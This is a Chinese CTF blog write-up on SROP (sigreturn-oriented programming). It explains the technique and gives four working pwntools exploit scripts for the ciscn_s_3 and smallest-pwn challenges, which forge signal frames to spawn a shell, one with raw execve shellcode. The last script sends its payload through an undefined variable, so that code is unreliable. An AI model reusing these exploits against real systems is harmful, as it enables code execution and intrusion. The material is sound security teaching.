@@ -1,0 +1,577 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  
+    <title>SROP | p1Kk&#39;s World!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="p1Kk">
+    
+
+    
+    <meta name="description" content="原理与利用https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srophttps://blog.csdn.net/luozhaotian/article/details/79607572https://www.anquanke.com/post/id/85810https://www.freebu">
+<meta name="keywords" content="pwn,笔记,栈">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SROP">
+<meta property="og:url" content="p1Kk.github.io/2019/10/05/SROP/SROP/index.html">
+<meta property="og:site_name" content="p1Kk&#39;s World!">
+<meta property="og:description" content="原理与利用https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srophttps://blog.csdn.net/luozhaotian/article/details/79607572https://www.anquanke.com/post/id/85810https://www.freebu">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/yichu.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/gadgets.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/3M4HND6UVY0R4T7K@VTI7_M.png">
+<meta property="og:updated_time" content="2020-04-07T13:51:50.878Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SROP">
+<meta name="twitter:description" content="原理与利用https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srophttps://blog.csdn.net/luozhaotian/article/details/79607572https://www.anquanke.com/post/id/85810https://www.freebu">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/yichu.png">
+
+    
+    <link rel="alternative" href="atom.xml" title="p1Kk&#39;s World!" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/site.jpg">
+    
+    
+    <link rel="apple-touch-icon" href="/img/head.png">
+    <link rel="apple-touch-icon-precomposed" href="/img/head.png">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo2.jpg" alt="p1Kk&#39;s World!" title="p1Kk&#39;s World!"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="p1Kk&#39;s World!">p1Kk&#39;s World!</a></h1>
+				<h2 class="blog-motto">艺无止境，功不唐捐。</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/tags">Tags</a></li>
+					
+						<li><a href="/categories">Categories</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:p1Kk.github.io">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	
+	  <article itemprop="articleBody"> 
+		  <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2019/10/05/SROP/SROP/" title="SROP" itemprop="url">SROP</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="p1Kk" target="_blank" itemprop="author">p1Kk</a>
+		
+  <p class="article-time">
+    <time datetime="2019-10-04T16:00:00.000Z" itemprop="datePublished"> Published 2019-10-05</time>
+    
+  </p>
+</header>
+	  <div class="article-content">
+		  
+		  <div id="toc" class="toc-article">
+			  <strong class="toc-title">Contents</strong>
+		  
+			  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#原理与利用"><span class="toc-number">1.</span> <span class="toc-text">原理与利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#🌰"><span class="toc-number">2.</span> <span class="toc-text">🌰</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-s-3-（64位）"><span class="toc-number">2.1.</span> <span class="toc-text">ciscn_s_3 （64位）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析"><span class="toc-number">2.1.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#法一【推荐】"><span class="toc-number">2.1.2.</span> <span class="toc-text">法一【推荐】</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#法二"><span class="toc-number">2.1.3.</span> <span class="toc-text">法二</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-1"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Defcon-2015-Qualifier-fuckup-（32位）"><span class="toc-number">2.2.</span> <span class="toc-text">Defcon 2015 Qualifier fuckup （32位）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#360春秋杯-smallest-pwn"><span class="toc-number">2.3.</span> <span class="toc-text">360春秋杯 smallest-pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-1"><span class="toc-number">2.3.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#法一"><span class="toc-number">2.3.2.</span> <span class="toc-text">法一</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-2"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#法二-1"><span class="toc-number">2.3.3.</span> <span class="toc-text">法二</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-3"><span class="toc-number">2.3.3.1.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol></li></ol>
+		  
+		  </div>
+		  
+		  <h1 id="原理与利用"><a href="#原理与利用" class="headerlink" title="原理与利用"></a>原理与利用</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop</a><br><a href="https://blog.csdn.net/luozhaotian/article/details/79607572" target="_blank" rel="noopener">https://blog.csdn.net/luozhaotian/article/details/79607572</a><br><a href="https://www.anquanke.com/post/id/85810" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85810</a><br><a href="https://www.freebuf.com/articles/network/87447.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/87447.html</a><br>其中的重点就是</p>
+<hr>
+<p>需要注意的是，我们在构造 ROP 攻击的时候，需要满足下面的条件</p>
+<ol>
+<li>可以通过栈溢出来控制栈的内容</li>
+<li>需要知道相应的地址</li>
+</ol>
+<ul>
+<li>“/bin/sh”</li>
+<li>Signal Frame</li>
+<li>syscall</li>
+<li>sigreturn</li>
+</ul>
+<ol start="3">
+<li>需要有够大的空间来塞下整个 sigal frame</li>
+</ol>
+<hr>
+<ol>
+<li>Signal Frame 被保存在用户的地址空间中，所以用户是可以读写的。</li>
+<li>由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 Signal Frame，所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame。</li>
+</ol>
+<hr>
+<p>32 位的 sigreturn 的调用号为 77；在 64 位系统中，sigreturn 系统调用对应的系统调用号为 15。寄存器 eax 中存放系统调用号，同时系统调用返回值也存放在 eax 中。<br>以64位系统为例，只需要<code>RAX=15</code>，并且执行 syscall 即可实现调用 sigreturn 调用。而 RAX 寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说 <strong>read 函数的返回值为读取的字节数</strong>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/*for x86*/</span><br><span class="line"></span><br><span class="line">mov eax,0x77</span><br><span class="line"></span><br><span class="line">int 80h</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">/*for x86_64*/</span><br><span class="line"></span><br><span class="line">mov rax,0xf</span><br><span class="line"></span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<hr>
+<ol>
+<li><p>伪造sigcontext结构，push到栈中。伪造过程中需要将eax，ebx，ecx等参数寄存器设置为相关值，eip设置为syscall的地址。并且需要注意的是esp，ebp和es，gs等段寄存器不可直接设置为0，经过个人测试，这样不会成功。</p>
+</li>
+<li><p>然后将返回地址设置为sigreturn的地址(或者相关gadget)。</p>
+</li>
+<li><p>最后当sigreturn系统调用执行完后，就直接执行你的系统调用了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">| sig_ret|  &lt;---esp</span><br><span class="line">| .......|</span><br><span class="line">|        |</span><br><span class="line">| frame  |  </span><br><span class="line">|........|</span><br><span class="line">|        |</span><br><span class="line">——————————</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h1 id="🌰"><a href="#🌰" class="headerlink" title="🌰"></a>🌰</h1><h2 id="ciscn-s-3-（64位）"><a href="#ciscn-s-3-（64位）" class="headerlink" title="ciscn_s_3 （64位）"></a>ciscn_s_3 （64位）</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>保护全开</p>
+<p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/yichu.png" alt><br>由汇编代码可得调用了<code>read(fd, &amp;buf, 0x400)</code> <code>write(fd, &amp;buf, 0x30)</code><br>存在溢出<br>本题中存在的对栈的处理pop push就只有 开始的<code>push rbp</code> 和<code>ret</code>=<code>pop rip</code><br>所以最后返回的rip被rbp赋值，我们可以覆盖到rbp从而改变了返回地址</p>
+<p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/gadgets.png" alt><br>同时还能发现故意设置的gadgets</p>
+<ol>
+<li>实现了上述的sigreturn 系统调用</li>
+<li>one_gadget</li>
+</ol>
+<h3 id="法一【推荐】"><a href="#法一【推荐】" class="headerlink" title="法一【推荐】"></a>法一【推荐】</h3><p>pwntools 中已经集成了对于 srop 的攻击：<a href="https://docs.pwntools.com/en/stable/rop/srop.html" target="_blank" rel="noopener">https://docs.pwntools.com/en/stable/rop/srop.html</a></p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">context(arch=&apos;amd64&apos;, os=&apos;linux&apos;, log_level = &apos;DEBUG&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line"># io = process(&apos;./s3&apos;)</span><br><span class="line">io = remote(&quot;node3.buuoj.cn&quot;,28503)</span><br><span class="line">elf = ELF(&quot;./s3&quot;)</span><br><span class="line"></span><br><span class="line">vuln_addr = 0x00000000004004ED</span><br><span class="line">sigreturn_addr = 0x00000000004004DA</span><br><span class="line">syscall_addr = 0x0000000000400501</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload  = &quot;/bin/sh\x00&quot;</span><br><span class="line">payload  = payload.ljust(0x10, &apos;a&apos;)</span><br><span class="line">payload += p64(vuln_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recv(0x20)</span><br><span class="line">binsh_addr = u64(io.recv(8))-280		# 0x00007fffffffde08 - 0x00007fffffffdcf0 = 280</span><br><span class="line">print &quot;binsh_addr = &quot; +hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = binsh_addr</span><br><span class="line">frame.rsi = 0</span><br><span class="line">frame.rdx = 0</span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line"></span><br><span class="line">payload  = &quot;/bin/sh\x00&quot;</span><br><span class="line">payload  = payload.ljust(0x10, &apos;a&apos;)</span><br><span class="line">payload += p64(sigreturn_addr) + p64(syscall_addr) + str(frame)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>execve的函数定义</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int execve(const char * filename,char * const argv[ ],char * const envp[ ]);</span><br></pre></td></tr></table></figure>
+
+<p>所以实际上我们要调用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;/bin/sh&quot;, 0, 0)</span><br><span class="line">        #rdi   #rsi #rdx</span><br></pre></td></tr></table></figure>
+
+<p>查找ropgadget</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary s3 --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure>
+
+<p>没有找到rdx，直接使用<code>__libc_csu_init</code>传参<br><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/3M4HND6UVY0R4T7K@VTI7_M.png" alt><br>比较麻烦</p>
+<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">io = process(&apos;./s3&apos;)</span><br><span class="line"># io = remote(&quot;node3.buuoj.cn&quot;,28503)</span><br><span class="line">elf = ELF(&quot;./s3&quot;)</span><br><span class="line">pop_rdi = 0x00000000004005a3</span><br><span class="line">pop_rsi_r15 = 0x00000000004005a1</span><br><span class="line">pop6 = 0x0000000000400596		# pop_rbx_rbp_r12_r13_r14_r15_ret</span><br><span class="line">ini_addr = 0x0000000000400580</span><br><span class="line">vuln_addr = 0x00000000004004ED</span><br><span class="line">sys_execve = 0x00000000004004E2</span><br><span class="line">syscall_addr = 0x0000000000400501</span><br><span class="line"># syscall_addr = 0x0000000000400517</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload  = &quot;/bin/sh\x00&quot;</span><br><span class="line">payload  = payload.ljust(0x10, &apos;a&apos;)</span><br><span class="line">payload += p64(vuln_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recv(0x20)</span><br><span class="line">binsh_addr = u64(io.recv(8))-280		# 0x00007fffffffde08 - 0x00007fffffffdcf0 = 280</span><br><span class="line">print &quot;binsh_addr = &quot; +hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload  = &quot;/bin/sh\x00&quot;</span><br><span class="line">payload  = payload.ljust(0x10, &apos;a&apos;)</span><br><span class="line">payload += p64(pop6)</span><br><span class="line">payload += p64(0) + p64(0) + p64(binsh_addr+0x50) + p64(0) + p64(0) + p64(0)</span><br><span class="line">	   #rbx	    #rbp     #r12                   #r13=rdx #r14=rsi #r15</span><br><span class="line">payload += p64(ini_addr) + p64(sys_execve)		# rax = 0x3b</span><br><span class="line">payload += p64(pop_rdi) + p64(binsh_addr) + p64(syscall_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>参考 ：<a href="https://zhuanlan.zhihu.com/p/106014234" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/106014234</a></p>
+</blockquote>
+<h2 id="Defcon-2015-Qualifier-fuckup-（32位）"><a href="#Defcon-2015-Qualifier-fuckup-（32位）" class="headerlink" title="Defcon 2015 Qualifier fuckup （32位）"></a>Defcon 2015 Qualifier fuckup （32位）</h2><p>看了一下，整个二进制文件都分析不清楚，只能get到漏洞点<br>32位牵扯到了VDSO<br><a href="https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/pwnable/fuckup" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/pwnable/fuckup</a><br><a href="http://binja.github.io/2015/05/19/defconctf2015-fuckup-writeup/" target="_blank" rel="noopener">http://binja.github.io/2015/05/19/defconctf2015-fuckup-writeup/</a></p>
+<h2 id="360春秋杯-smallest-pwn"><a href="#360春秋杯-smallest-pwn" class="headerlink" title="360春秋杯 smallest-pwn"></a>360春秋杯 smallest-pwn</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>ida少的可怜，总之实现了<code>read(0, $rsp, 0x400)</code></p>
+<h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>没有给我们可用的sigreturn，这就用到前文说的:</p>
+<blockquote>
+<p>以64位系统为例，只需要<code>RAX=15</code>，并且执行 syscall 即可实现调用 sigreturn 调用。而 RAX 寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说 <strong>read 函数的返回值为读取的字节数</strong>。</p>
+</blockquote>
+<p>我们希望通过syscall调用execve(“/bin/sh”, 0, 0) 跟第一题有点像哈</p>
+<hr>
+<ol>
+<li>第一次read时将rsp写成start_addr，然后又返回start_addr再次写入’\xB3’，read返回真正写入数 1 给rax，同时将rsp最末位改成了B3，即rsp = 0x4000B3，跳过了<code>xor rax, rax</code><br>write函数调用号就是 1 ，stdout的值也是1，<code>mov rdi, rax</code>刚好会设置好write的第一个参数，调用write(1, $rsp, 0x400)<br>即可泄露stack_addr</li>
+<li>通过设置read返回字节数控制rax = 15，从而调用sigreturn</li>
+<li>在栈地址中写入binsh字符串</li>
+<li>构造execve(“/bin/sh”, 0, 0)<br>将<code>rax</code>设置成59（即<code>execve</code>系统调用号），将<code>rdi</code>设置成字符串<code>/bin/sh</code>的地址（我们写在栈上了），将<code>rip</code>设置成系统调用指令<code>syscall</code>的内存地址，最后，将<code>rt_sigreturn</code>手动设置成<code>sigreturn</code>系统调用的内存地址。那么，当这个伪造的<code>sigreturn</code>系统调用返回之后，相应的寄存器就被设置成了攻击者可以控制的值，一旦<code>sigreturn</code>返回，就会去执行<code>execve</code>系统调用，打开一个shell。</li>
+</ol>
+<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">context(arch=&apos;amd64&apos;, os=&apos;linux&apos;, log_level = &apos;DEBUG&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(&quot;./smallest&quot;)</span><br><span class="line">start_addr = 0x00000000004000B0</span><br><span class="line">vuln_addr = 0x00000000004000B3</span><br><span class="line">syscall_addr = 0x00000000004000BE</span><br><span class="line"></span><br><span class="line">payload = p64(start_addr) * 3</span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(&apos;\xB3&apos;)		# rax = 1 --&gt;write(1, $rsp, 0x400)</span><br><span class="line">io.recv(8)</span><br><span class="line">stack_addr = u64(io.recv(8))</span><br><span class="line">print &quot;stack_addr = &quot; +hex(stack_addr)</span><br><span class="line"></span><br><span class="line">frame =  SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_read</span><br><span class="line">frame.rdi = 0</span><br><span class="line">frame.rsi = stack_addr</span><br><span class="line">frame.rdx = 0x400</span><br><span class="line">frame.rsp = stack_addr</span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line"># read(0, stack_addr, 0x400)</span><br><span class="line"></span><br><span class="line">payload = p64(start_addr) + p64(0) + str(frame)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload = p64(syscall_addr)</span><br><span class="line">payload = payload.ljust(15, &quot;\x00&quot;)	# rax = 15</span><br><span class="line">io.send(payload)</span><br><span class="line"># start sigreturn</span><br><span class="line"></span><br><span class="line">frame =  SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = stack_addr + 0x150		# binsh</span><br><span class="line">frame.rsi = 0</span><br><span class="line">frame.rdx = 0</span><br><span class="line">frame.rsp = stack_addr</span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line"></span><br><span class="line">payload = p64(start_addr) + p64(0) + str(frame)</span><br><span class="line">payload = payload.ljust(0x150, &apos;\x00&apos;)</span><br><span class="line">payload += &quot;/bin/sh\x00&quot;</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload = p64(syscall_addr)</span><br><span class="line">payload = payload.ljust(15, &quot;\x00&quot;)	# rax = 15</span><br><span class="line">io.send(payload)</span><br><span class="line"># start sigreturn</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="法二-1"><a href="#法二-1" class="headerlink" title="法二"></a>法二</h3><p>SROP + mprotect + shellcode<br>前面部分和整体思想和法一是一样的，只是最后不是execve 而是用mprotext修改内存区属性再写入shellcode拿shell<br>这个参考：<a href="https://bestwing.me/2017-360chunqiu-online.html" target="_blank" rel="noopener">https://bestwing.me/2017-360chunqiu-online.html</a> 学到的新方法</p>
+<h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">context(arch=&apos;amd64&apos;, os=&apos;linux&apos;, log_level = &apos;DEBUG&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">io = process(&quot;./smallest&quot;)</span><br><span class="line">start_addr = 0x00000000004000B0</span><br><span class="line">vuln_addr = 0x00000000004000B3</span><br><span class="line">syscall_addr = 0x00000000004000BE</span><br><span class="line"></span><br><span class="line">payload = p64(start_addr)</span><br><span class="line">payload += p64(start_addr)#fill</span><br><span class="line">payload += p64(start_addr)#fill</span><br><span class="line">io.send(payload)</span><br><span class="line">raw_input(&quot;joker&quot;)</span><br><span class="line"></span><br><span class="line">#write infor leak</span><br><span class="line">io.send(&quot;\xb3&quot;)#write 2 start_addr last byte</span><br><span class="line">data = io.recv(8)</span><br><span class="line">data = io.recv(8)</span><br><span class="line">stack_addr = u64(data)</span><br><span class="line">print &quot;[*]:stack:&#123;0&#125;&quot;.format(hex(stack_addr))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_read</span><br><span class="line">frame.rdi = 0</span><br><span class="line">frame.rsi = stack_addr</span><br><span class="line">frame.rdx = 0x300</span><br><span class="line">frame.rsp = stack_addr</span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line"></span><br><span class="line">payload = p64(start_addr)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">payload += str(frame)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">raw_input(&quot;kkkk&quot;)</span><br><span class="line">payload = p64(0x4000B3)#fill</span><br><span class="line">payload += p64(0x4000B3)#fill</span><br><span class="line">payload = payload[:15]</span><br><span class="line">io.send(payload)#set rax=sys_rt_sigreturn</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_mprotect</span><br><span class="line">frame.rdi = (stack_addr&amp;0xfffffffffffff000)</span><br><span class="line">frame.rsi = 0x1000</span><br><span class="line">frame.rdx = 0x7</span><br><span class="line">frame.rsp = stack_addr + 0x108</span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line">payload = p64(start_addr)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">payload += str(frame)</span><br><span class="line"></span><br><span class="line">payload += p64(stack_addr + 0x108 + 8)</span><br><span class="line">#payload += cyclic(0x100)#addr ====&gt; start_addr + 0x108</span><br><span class="line">payload += &quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;#shellcode</span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">raw_input(&quot;kkkk&quot;)</span><br><span class="line">payload = p64(0x4000B3)#fill</span><br><span class="line">payload += p64(0x4000B3)#fill</span><br><span class="line">payload = payload[:15]</span><br><span class="line">io.send(payload)#set rax=sys_rt_sigreturn</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
